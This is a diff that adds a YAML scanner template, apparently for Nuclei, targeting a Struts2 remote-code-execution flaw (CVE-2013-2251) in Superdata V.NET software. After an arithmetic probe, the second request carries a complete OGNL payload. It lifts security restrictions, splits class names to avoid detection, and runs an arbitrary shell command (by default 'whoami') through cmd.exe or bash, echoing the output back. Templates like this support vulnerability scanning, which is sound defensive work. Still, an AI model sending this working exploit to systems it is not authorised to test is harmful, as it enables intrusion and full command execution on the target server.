@@ -1,0 +1,53 @@
+id: superdata-struts2-rce
+
+info:
+  name: Superdata Software V.NET Struts2 Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Superdata software management system has a code execution vulnerability. The vulnerability allows attackers to execute arbitrary commands, read and write files, and perform other malicious activities.
+  reference:
+    - https://fofa.so/
+  classification:
+    cve-id:
+      - CVE-2013-2251
+
+variables:
+  command: "whoami"
+
+http:
+  - raw:
+      - |
+        POST /home HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Java/1.8.0_341
+        Content-Type: application/x-www-form-urlencoded
+
+        redirect:%25{40012*43801}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "1752565612"
+
+  - raw:
+      - |
+        POST /home HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Java/1.8.0_341
+        Content-Type: application/x-www-form-urlencoded
+
+        redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#_memberAccess=new+com.opensymphony.xwork2.ognl.SecurityMemberAccess(true),#commods='{{command}}',#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')),#outmansec=(#iswin?(new java.lang.String[]{'cmd.exe','/c',#commods}):(new java.lang.String[]{'bash','-c',#commods})),#a=new+java.lang.ProcessBuilder(#outmansec).start().getInputStream(),#s=new+java.util.Scanner(#a).useDelimiter('\\A'),#str=#s.hasNext()?#s.next():'',#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('GB2312'),#resp.getWriter().println(#str),#resp.getWriter().flush(),#resp.getWriter().close()}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{command}}"
